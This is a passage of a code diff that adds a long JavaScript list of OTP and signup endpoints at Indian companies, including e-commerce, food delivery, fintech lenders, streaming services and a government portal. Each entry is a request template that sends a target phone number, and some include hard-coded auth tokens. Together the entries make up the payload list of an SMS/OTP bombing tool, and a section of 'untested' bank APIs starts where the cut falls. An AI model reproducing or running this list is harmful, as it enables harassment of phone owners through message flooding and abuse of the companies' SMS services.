+        url: "https://api.breeze.in/session/start",
+        method: "POST",
+        headers: {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "authVerificationType": "otp", "countryCode": "+91"})
+    },
+    {
+        name: "Zoho Store",
+        url: "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN",
+        method: "POST",
+        headers: {"Accept": "*/*", "Content-Length": "0"}
+    },
+    {
+        name: "Aditya Birla New",
+        url: "https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Muthoot Finance",
+        url: "https://www.muthootfinance.com/smsapi.php",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        data: { "_raw": "mobile={phone}&pin=XjtYYEdhP0haXjo3" }
+    },
+    {
+        name: "GoPaySense",
+        url: "https://api.gopaysense.com/users/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "IIFL SMS",
+        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        data: { "_raw": "apply_for=18&full_name=Test&mobile_number={phone}&terms_and_condition=1&_drupal_ajax=1" }
+    },
+    {
+        name: "BankOpen",
+        url: "https://v2-api.bankopen.co/users/register/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"username": phone, "is_open_capital": 1})
+    },
+    {
+        name: "Tata Capital Retail SMS",
+        url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"header": {"authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", "identifier": "nli"}, "body": {"mobileNumber": phone}})
+    },
+    {
+        name: "TradeIndia SMS",
+        url: "https://apis.tradeindia.com/app_login_api/login_app",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": `+91${phone}`})
+    },
+    {
+        name: "Orange Health",
+        url: "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile_number": phone, "customer_auto_fetch_message": true})
+    },
+    {
+        name: "AstroSage SMS",
+        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "Freedo Rentals",
+        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"email_id": "test@gmail.com", "first_name": "Test", "mobile_number": phone})
+    },
+    {
+        name: "Bisleri",
+        url: "https://apis.bisleri.com/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"email": "test@gmail.com", "mobile": phone})
+    },
+    {
+        name: "QuickRide",
+        url: "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
+        method: "POST",
+        headers: {"APP-TOKEN": "s16-q9fz-jy3p-rk", "Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride" }
+    },
+    {
+        name: "Clovia",
+        url: "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "Vahak",
+        url: "https://api.vahak.in/v1/u/o_w",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone_number": phone, "scope": 0, "is_whatsapp": false})
+    },
+    {
+        name: "Ixigo SMS",
+        url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "sixDigitOTP=true&prefix=%2B91&phone={phone}&resendOnWhatsapp=false" }
+    },
+    {
+        name: "Zerodha SMS",
+        url: "https://zerodha.com/account/registration.php",
+        method: "POST",
+        headers: {"Content-Type": "application/json;charset=UTF-8"},
+        data: (phone) => JSON.stringify({"mobile": phone, "source": "zerodha", "partner_id": ""})
+    },
+    {
+        name: "Testbook SMS",
+        url: "https://api.testbook.com/api/v2/mobile/signup",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "signupDetails": {"page": "HomePage"}})
+    },
+    {
+        name: "Beyoung",
+        url: "https://www.beyoung.in/api/sendOtp.json",
+        method: "POST",
+        headers: {"Content-Type": "application/json;charset=UTF-8"},
+        data: (phone) => JSON.stringify({"username": phone, "username_type": "mobile", "service_type": 0})
+    },
+    {
+        name: "MedKart",
+        url: "https://app.medkart.in/api/v1/auth/requestOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile_no": phone})
+    },
+    {
+        name: "CoverFox",
+        url: "https://www.coverfox.com/otp/send/",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "contact={phone}" }
+    },
+    {
+        name: "LoveLocal",
+        url: "https://homedeliverybackend.mpaani.com/auth/send-otp",
+        method: "POST",
+        headers: {"client-code": "vulpix", "Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone_number": phone, "role": "CUSTOMER"})
+    },
+    {
+        name: "TyrePlex SMS",
+        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
+    },
+    {
+        name: "Hotstar SMS",
+        url: "https://api.hotstar.com/um/v3/users/register?register-by=phone_otp",
+        method: "PUT",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone_number": phone, "country_prefix": "91"})
+    },
+    {
+        name: "SonyLIV SMS",
+        url: "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobileNumber": phone, "channelPartnerID": "MSMIND", "country": "IN"})
+    },
+    {
+        name: "Snapdeal SMS",
+        url: "https://m.snapdeal.com/signupCompleteAjax",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "j_mobilenumber={phone}&agree=true&j_fullname=TestUser" }
+    },
+    {
+        name: "Zomato SMS",
+        url: "https://www.zomato.com/webroutes/auth/login",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"country_id": 1, "phone": phone, "verification_type": "sms", "method": "phone"})
+    },
+    {
+        name: "Zomato Login SMS",
+        url: "https://www.zomato.com/php/asyncLogin.php",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "phone={phone}&type=sms" }
+    },
+    {
+        name: "Cuemath SMS",
+        url: "https://www.cuemath.com/api/v4/parents/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "full_name": "TestUser", "email": "test@gmail.com"})
+    },
+    {
+        name: "Careers360 SMS",
+        url: "https://www.careers360.com/ajax/no-cache/user/otp-send",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "mobile_number={phone}&method=call" }
+    },
+    {
+        name: "Gaana SMS",
+        url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": `91-${phone}`})
+    },
+    {
+        name: "Flipkart OTP",
+        url: "https://www.flipkart.com/api/5/user/otp/generate",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Ullu SMS",
+        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
+        method: "POST",
+        headers: {}
+    },
+    {
+        name: "Paytm SMS Old",
+        url: "https://accounts.paytm.com/v2/api/register",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "clientId": "paytm-web-secure"})
+    },
+    {
+        name: "Paytm SMS",
+        url: "https://accounts.paytm.com/signin/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Ogonn SMS",
+        url: "https://ogonn.in/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "mobile={phone}" }
+    },
+    {
+        name: "Aakash Digital SMS",
+        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "mobileval={phone}" }
+    },
+    {
+        name: "BigCash SMS",
+        url: "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
+        method: "GET",
+        headers: {"Referer": "https://www.bigcash.live/games/poker"}
+    },
+    {
+        name: "MyGov SMS",
+        url: "https://auth.mygov.in/regapi/register_api_ver1/?mobile={phone}",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "MagicPin SMS",
+        url: "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": `91${phone}`, "authMethod": "sms", "token": ""})
+    },
+    {
+        name: "HeroFinCorp GET",
+        url: "https://festive.api.herofincorp.com/v1/customer/otp/{phone}",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "MuscleBlaze SMS",
+        url: "https://www.muscleblaze.com/veronica/user/validate/9/{phone}/signup?plt=2&st=9",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "RedBus OTP",
+        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "Univest OTP",
+        url: "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "WorkIndia",
+        url: "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "Jockey SMS",
+        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "Vyapar OTP",
+        url: "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "ConfirmTkt",
+        url: "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "CodFirm",
+        url: "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&storeUrl=bellavita1.myshopify.com",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "Coolwinks",
+        url: "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "Zee5 OTP",
+        url: "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "BookMyShow SMS",
+        url: "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"channel": "phone", "subChannel": "sms", "details": {"phone": phone, "origin": "https://in.bookmyshow.com"}})
+    },
+    {
+        name: "BigBasket SMS",
+        url: "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"identifier": phone})
+    },
+    {
+        name: "Dominos SMS",
+        url: "https://api.dominos.co.in/loginhandler/forgotpassword",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "firstName": "", "lastName": ""})
+    },
+    {
+        name: "BurgerKing SMS",
+        url: "https://consumer-apis.burgerking.in/api/v1/user/signUp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone_no": phone})
+    },
+    {
+        name: "PaisaOnSalary",
+        url: "https://cms.paisaonsalary.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "event_name": "login"})
+    },
+    {
+        name: "CashKredit",
+        url: "https://api.cashkredit.in/v2/apply-loan/register-user",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"pan": "ABCDE1234F", "name": "Test", "mobile": phone, "email": "test@gmail.com", "terms": "1"})
+    },
+    {
+        name: "RupeeLending",
+        url: "https://rupeelending.com/apply-now/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "BrightLoans",
+        url: "https://brightloans.in/login-sbm",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
+    },
+    {
+        name: "SalaryTopUp",
+        url: "https://salarytopup.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "event_name": "login"})
+    },
+    {
+        name: "TataCapital PL",
+        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobileNumber": phone, "deviceOS": "Web", "applSource": "PL"})
+    },
+    {
+        name: "INRFlash",
+        url: "https://offers.inrflash.com/campinr/index.php",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "action=send_otp&phoneNo={phone}" }
+    },
+    {
+        name: "CRMSL",
+        url: "https://api.crmsl.com/Api/Website/InstantJourneyController/appCustomerRegisteration",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "event_name": "login"})
+    },
+    {
+        name: "Moglix V2",
+        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2",
+        method: "POST",
+        headers: {"Content-Type": "application/json", "x-platform": "PWA"},
+        data: (phone) => JSON.stringify({"email": "", "phone": phone, "type": "p", "source": "signup", "buildVersion": "37.3.1"})
+    },
+    {
+        name: "MyMoneyBazaar",
+        url: "https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone_number": phone})
+    },
+    {
+        name: "Shopsy",
+        url: "https://www.shopsy.in/1.rome/api/1/action/view",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"actionRequestContext": {"loginId": phone, "loginType": "MOBILE", "verificationType": "OTP", "type": "LOGIN_IDENTITY_VERIFY"}})
+    },
+    {
+        name: "PrimeCash",
+        url: "https://api.primecash.app/api/v1/user",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "isTNCVerified": true, "hash": "O9BmoTki4+6"})
+    },
+    {
+        name: "Allen",
+        url: "https://api.allen-live.in/api/v1/auth/sendOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json", "x-device-id": "9aad014a-4181-4fe7-99e1-9ac721e538b4", "x-client-type": "mweb"},
+        data: (phone) => JSON.stringify({"country_code": "91", "phone_number": phone, "persona_type": "STUDENT"})
+    },
+    {
+        name: "SalaryOnTime",
+        url: "https://journey.sotcrm.com/api/v1/journey-auth/send-otp/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "sourceId": 1})
+    },
+    {
+        name: "ClickMyLoan",
+        url: "https://appb.clickmyloan.com/api/v2/authentication/phone_no_verify/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone_number": phone})
+    },
+    {
+        name: "Creditt",
+        url: "https://prod-v4-app-api.credittapi.com/app/auth/mobile/otp/sent",
+        method: "POST",
+        headers: {"Content-Type": "application/json", "appStore": "web_app", "api_version": "1.0"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "UdharCapital",
+        url: "https://www.udharcapital.com/api/send_otp.php",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "phone={phone}" }
+    },
+    {
+        name: "RojgarKaro",
+        url: "https://rojgarkaro.in/api/auth/sendOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile_no": phone, "isSessionActive": false})
+    },
+    {
+        name: "BajajFinserv",
+        url: "https://apigateway.bajajfinserv.in/apigateway/otp/sso",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobileNumber": phone, "source": "WEB"})
+    },
+    {
+        name: "TataCliq",
+        url: "https://www.tatacliq.com/api/v1/otp/send",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "state": "login"})
+    },
+    {
+        name: "Droom",
+        url: "https://api.droom.in/v1/user/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "country_code": "91"})
+    },
+    {
+        name: "CureFoods",
+        url: "https://web.curefoods.com/api/v2/auth/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "country_code": "+91"})
+    },
+    {
+        name: "Puma",
+        url: "https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "dwfrm_phone={phone}&format=ajax" }
+    },
+    {
+        name: "Decathlon",
+        url: "https://www.decathlon.in/api/v1/auth/sendOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "isLogin": true})
+    },
+    {
+        name: "Zivame SMS",
+        url: "https://www.zivame.com/auth/public/v1/otp/send",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "countryCode": "IN"})
+    },
+    {
+        name: "PolicyBazaar",
+        url: "https://www.policybazaar.com/api/v1/otp/send",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "source": "web"})
+    },
+    {
+        name: "CityFurnish",
+        url: "https://www.cityfurnish.com/api/v1/auth/sendOtp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Goibibo SMS",
+        url: "https://www.goibibo.com/api/v2/auth/otp/send",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "countryCode": "+91"})
+    },
+    {
+        name: "PocketMoney SMS",
+        url: "https://api2.the-pocket-money.com/pokktmoney/send_verification_code?verification_phone={phone}",
+        method: "GET",
+        headers: {}
+    },
+    {
+        name: "Oziva SMS",
+        url: "https://api.prod.oziva.in/nitro/send/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "source": "order_management", "type": "sms"})
+    },
+    {
+        name: "Astroyogi SMS",
+        url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"PhoneNumber": phone, "PhoneCode": "91", "Domain": "Web"})
+    },
+    {
+        name: "Refyne SMS",
+        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"channel": "SMS", "recipient": phone})
+    },
+    {
+        name: "HERE SMS",
+        url: "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone, "source": "sms"})
+    },
+    {
+        name: "VisitApp SMS",
+        url: "https://api.getvisitapp.com/v3/new-auth/login-phone",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "countryCode": 91, "platform": "WEB"})
+    },
+    {
+        name: "MakeMyTrip SMS",
+        url: "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"loginId": phone, "type": 6, "channel": ["MOBILE"], "countryCode": "91"})
+    },
+    {
+        name: "FreeCharge SMS",
+        url: "https://www.freecharge.in/api/ims/rest/otp/resend",
+        method: "POST",
+        headers: {"Content-Type": "application/json", "fcChannel": "12"},
+        data: (phone) => JSON.stringify({"otpThroughCall": false, "platformType": "WEB"})
+    },
+    {
+        name: "Ajio SMS",
+        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"firstName": "Test", "login": "test@gmail.com", "password": "Test@123", "mobileNumber": phone, "requestType": "SENDOTP"})
+    },
+    {
+        name: "AJIO SMS New",
+        url: "https://www.ajio.com/api/otp/generate",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Grofers SMS",
+        url: "https://grofers.com/v2/accounts/",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "user_phone={phone}" }
+    },
+    {
+        name: "Sulekha",
+        url: "https://myaccount.sulekha.com/network/userauthv1.aspx",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        data: { "_raw": "mobile={phone}" }
+    },
+    {
+        name: "Country Delight GET",
+        url: "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
+        method: "GET",
+        headers: {"User-Agent": "Mozilla/5.0"}
+    },
+    {
+        name: "Eka Care",
+        url: "https://auth.eka.care/auth/resend",
+        method: "GET",
+        headers: {"User-Agent": "Mozilla/5.0"}
+    },
+    {
+        name: "Planet Fashion",
+        url: "https://www.planetfashion.in/login/resendOTP?isAjax=true",
+        method: "GET",
+        headers: {"User-Agent": "Mozilla/5.0"}
+    },
+    {
+        name: "OkCredit",
+        url: "https://web.okcredit.in/api/authn/v1.0/otp:request",
+        method: "GET",
+        headers: {"User-Agent": "Mozilla/5.0"}
+    },
+    {
+        name: "Naaptol SMS",
+        url: "https://m.naaptol.com/faces/jsp/ajax/ajax.jsp",
+        method: "GET",
+        headers: {"User-Agent": "Mozilla/5.0"}
+    },
+    {
+        name: "Star Health",
+        url: "https://www.starhealth.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "MobiKwik SMS",
+        url: "https://www.mobikwik.com/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Shopclues SMS",
+        url: "https://www.shopclues.com/api/v1/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Croma SMS",
+        url: "https://api.croma.com/otp/generate",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Myntra SMS",
+        url: "https://www.myntra.com/gw/mobile-auth/otp/generate",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Blinkit New",
+        url: "https://blinkit.com/api/otp/generate",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "PharmEasy New",
+        url: "https://pharmeasy.in/api/auth/requestOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Practo New",
+        url: "https://accounts.practo.com/send_otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "country_code": "91"})
+    },
+    {
+        name: "PizzaHut SMS",
+        url: "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "countryCode": "91"})
+    },
+    {
+        name: "Ref-R Lenskart",
+        url: "https://www.ref-r.com/clients/lenskart/smsApi",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Apollo Pharmacy",
+        url: "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "PinkNBlu",
+        url: "https://pinknblu.com/v1/auth/generate/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Delhivery Direct",
+        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
+        method: "GET",
+        headers: {"User-Agent": "Mozilla/5.0"}
+    },
+    {
+        name: "Dream11 GraphQL",
+        url: "https://www.dream11.com/graphql/mutation/pwa/register",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNumber": phone, "channel": "sms"})
+    },
+    {
+        name: "Olacabs Login",
+        url: "https://accounts.olacabs.com/api/login",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "country_code": "91"})
+    },
+    {
+        name: "MakeMyTrip Check",
+        url: "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"loginId": phone, "countryCode": "91"})
+    },
+    {
+        name: "Stratzy SMS",
+        url: "https://stratzy.in/api/web/auth/sendPhoneOTP",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phoneNo": phone})
+    },
+    {
+        name: "JustDial SMS",
+        url: "https://api.justdial.com/otp/send",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "EarlySalary SMS",
+        url: "https://api.earlysalary.com/v1/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "ZestMoney SMS",
+        url: "https://api.zestmoney.in/v1/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Udemy SMS",
+        url: "https://www.udemy.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "UPGRAD SMS",
+        url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone, "country_code": "91"})
+    },
+    {
+        name: "Coursera SMS",
+        url: "https://www.coursera.org/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Pay Amazon SMS",
+        url: "https://pay.amazon.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "McDelivery SMS",
+        url: "https://www.mcdelivery.co.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Hotstar SMS New",
+        url: "https://www.hotstar.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "SonyLIV SMS New",
+        url: "https://www.sonyliv.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+
+    // ============================================================
+    // 🏦 BANK APIS (Untested)
+    // ============================================================
+    {
+        name: "Kotak Bank SMS",
